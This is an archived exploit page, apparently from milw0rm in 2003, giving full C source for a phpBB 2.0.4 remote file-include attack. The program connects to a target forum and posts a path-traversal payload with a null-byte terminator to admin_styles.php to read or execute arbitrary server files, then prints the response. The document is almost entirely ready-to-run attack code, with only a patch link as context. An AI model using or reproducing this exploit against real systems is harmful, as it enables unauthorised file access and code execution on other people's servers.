<html><head><title>phpBB 2.0.4 Remote php File Include Exploit
</title></head><pre>/***********************************************************/
/* phpBB 2.0.4 Remote Admin_Styles.PHP Theme_Info.CFG File Include  */
/*                                                                                                    */
/*                Exploit made on June 2003 by Spoofed Existence               */
/*                                                                                                    */
/*       Patch : http://www.phpbb.com/phpBB/viewtopic.php?t=113826      */
/***********************************************************/

#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;

int main()
{
 //The socket stuff
 struct hostent *hp;
 struct sockaddr_in sa;
 int sock;

 //The input stuff
 char server[100];
 char location[100];
 char sfile[100];
 int escapes;
 char* file;

 //The request stuff
 char* request;
 char* postdata;
 char* header;

 //The buffer to store the response
 char buffer[4096];
 int tworeturns = 0;
 int showing = 0;

 //Other
 int i;

 //Ask the server
 printf(&quot;Server: &quot;);
 scanf(&quot;%100s&quot;, server);
 printf(&quot;Forum location: &quot;);
 scanf(&quot;%100s&quot;, location);
 printf(&quot;Directories to escape: &quot;);
 scanf(&quot;%i&quot;, &amp;escapes);
 printf(&quot;File to get/execute: &quot;);
 scanf(&quot;%100s&quot;, sfile);


 //Start the exploit!
 printf(&quot;\n\nStarting the exploit...\n&quot;);

 //Connect to the server
 printf(&quot;Creating socket... &quot;);
 if((sock = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0)
 {
  printf(&quot;Failed!\n&quot;);
  return 0;
 } else{ printf(&quot;Done!\n&quot;);
 }


 printf(&quot;Looking up server IP... &quot;);
 if((hp = gethostbyname((char*)server)) == NULL)
 {
  printf(&quot;Failed!\n&quot;);
  return 0;
 } else { printf(&quot;Done!\n&quot;);
 }


 printf(&quot;Connecting %s:80... &quot;, server);
 memcpy(&amp;sa.sin_addr, hp-&gt;h_addr_list[0], hp-&gt;h_length);
 sa.sin_family = AF_INET;
 sa.sin_port = htons(80);
 if(connect(sock, (struct sockaddr*)&amp;sa, sizeof(sa)))
 {
  printf(&quot;Failed!\n&quot;);
  return 0;
 } else { printf(&quot;Done!\n&quot;);
 }


 //Create the request
 printf(&quot;Building request... &quot;);

 //Create the postdata
 file = (char*)malloc(sizeof(char) * (escapes * 3 + strlen(sfile) + 1));

 while(escapes &gt; 0)
 {
  if(escapes == 1)
  {
   sprintf(file, &quot;%s%s%s&quot;, file, &quot;..&quot;, sfile);
  } else { sprintf(file, &quot;%s%s&quot;, file, &quot;../&quot;);
  }

  escapes --;
 }

 postdata = (char*)malloc((27 + strlen(file)) * sizeof(char));
 sprintf(postdata, &quot;send_file= &amp;install_to=%s%s00&quot;, file, &quot;%&quot;);

 header = (char*)malloc((170 + strlen(server) + strlen(location)) *
sizeof(char));
 sprintf(header, &quot;POST /%s/admin/admin_styles.php?mode=addnew
HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost:
%s\r\nContent-Length: %i\r\nConnection: close\r\n\r\n&quot;, location, server,
strlen(postdata));

 request = (char*)malloc((strlen(postdata) + strlen(header) + 1) *
sizeof(char));
 sprintf(request, &quot;%s%s&quot;, header, postdata);

 printf(&quot;Done!\n&quot;);


 //Send the request
 printf(&quot;Sending request... &quot;);
 write(sock, request, strlen(request));
 printf(&quot;Done!\n&quot;);

 printf(&quot;\nResponse:\n&quot;);
 //Get the response
 while(recv(sock, buffer, 4096, 0) != 0)
 {
  for(i = 0; i &lt; strlen(buffer); i++)
  {
   //Only show the character when it should
   if(showing == 1)
   {
    printf(&quot;%c&quot;, buffer[ i ]);
   }


   //Stop showing from \n&lt;br&gt;\n
   if(buffer[ i ] == '\n' &amp;&amp; buffer[i + 1] == '&lt;' &amp;&amp; buffer[i + 2] == 'b' &amp;&amp;
buffer[i + 3] == 'r' &amp;&amp; buffer[i + 4] == '&gt;' &amp;&amp; buffer[i + 5] == '\n' &amp;&amp;
showing == 1)
   {
    showing = 0;
    tworeturns = 0;
   }
   //Or from \n&lt;br /&gt;\n
   if(buffer[ i ] == '\n' &amp;&amp; buffer[i + 1] == '&lt;' &amp;&amp; buffer[i + 2] == 'b' &amp;&amp;
buffer[i + 3] == 'r' &amp;&amp; buffer[i + 4] == ' ' &amp;&amp; buffer[i + 5] == '/' &amp;&amp;
buffer[i + 6] == '&gt;' &amp;&amp; buffer[i + 7] == '\n' &amp;&amp; showing == 1)
   {
    showing = 0;
    tworeturns = 0;
   }

   //If there's a return and tworeturns = true, start showing it
   if(buffer[ i ] == '\n' &amp;&amp; tworeturns == 1)
   {
    showing = 1;
   }

   //If there are two returns, set tworeturns to true and add 3 to i
   if(buffer[ i ] == '\r' &amp;&amp; buffer[i + 1] == '\n' &amp;&amp; buffer[i + 2] == '\r'
&amp;&amp; buffer[i + 3] == '\n')
   {
    tworeturns = 1;
    i += 3;
   }
  }
 }
 printf(&quot;\n&quot;);

 return 0;
}

// milw0rm.com [2003-06-30]</pre></html>